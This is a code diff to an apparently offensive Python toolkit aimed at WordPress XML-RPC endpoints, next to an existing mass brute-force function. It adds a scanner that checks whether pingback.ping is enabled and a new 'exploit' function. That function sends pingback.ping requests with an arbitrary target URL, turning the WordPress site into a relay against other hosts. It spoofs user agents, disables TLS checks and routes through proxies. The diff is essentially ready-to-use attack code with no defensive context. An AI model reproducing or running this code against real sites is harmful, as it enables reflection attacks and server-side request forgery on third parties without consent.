@@ -93,13 +93,40 @@ def wp_xmlrpc_mass_bruteforce(u,user_agent=None,cookie=None,path='/xmlrpc.php',t
   pass
  return False
 
-
 def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
- url=u.split('://')[0]+"://"+urlparse(u).netloc
  if proxy:
   proxy={'http':'http://'+proxy}
  if u[len(u)-1]=='/':
   u=u[0:len(u)-1]
+ if user_agent:
+  us=user_agent
+ else:
+  us=random.choice(ua)
+ hed={"User-Agent":us}
+ if cookie:
+  hed.update({"Cookie":cookie})
+ u+=path
+ post ="""
+ <?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>system.listMethods</methodName> 
+<params></params> 
+</methodCall>
+"""
+ try:
+  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
+  l=[ x.replace('</string></value>','').replace('<value><string>','').strip() for x in r.text.split('<data>')[1].split('</data>')[0].strip().split('\n')]
+  if "pingback.ping" in l:
+   return True
+ except:
+  pass
+ return False
+
+
+def wp_xmlrpc_pingback_exploit(u,user_agent=None,target_url="https://www.google.com/",cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
+ url=u.split('://')[0]+"://"+urlparse(u).netloc
+ if proxy:
+  proxy={'http':'http://'+proxy}
  if user_agent:
   us=user_agent
  else:
@@ -113,7 +140,7 @@ def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cook
 <methodName>pingback.ping</methodName>
 <params>
 <param>
-<value><string>"""+test_url+"""</string></value>
+<value><string>"""+target_url+"""</string></value>
 </param>
 <param>
 <value><string>"""+u+"""</string></value>
@@ -123,11 +150,8 @@ def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cook
 """
  try:
   r = requests.post(url, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
-  if ("<value><int>17</int></value>" in r.text) or ("<value><int>16</int></value>" in r.text) or ("<value><int>0</int></value>" in r.text):
-   return True
  except:
   pass
- return False
 
 
 
